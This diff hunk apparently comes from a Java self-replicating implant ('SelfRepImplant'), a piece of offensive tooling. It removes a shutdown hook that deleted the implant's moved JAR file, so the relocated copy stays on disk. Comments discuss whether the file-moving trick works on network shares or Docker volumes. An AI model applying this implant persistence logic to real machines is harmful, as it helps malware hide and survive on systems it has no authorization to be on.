@@ -301,15 +301,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
          * Any Java process running on _this_ system will still be able to load any classes in JARs on the classpath.
          * However, it is unclear if this file moving trick will work over network shares or even on Docker volumes.
          */
-
-        // Don't do this for real later...
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            try {
-                Files.delete(moved);
-            } catch (IOException e) {
-                System.out.println("[+] Deleted '" + moved + "'.");
-            }
-        }));
     }
 
     private static Optional<String> getHostname() {
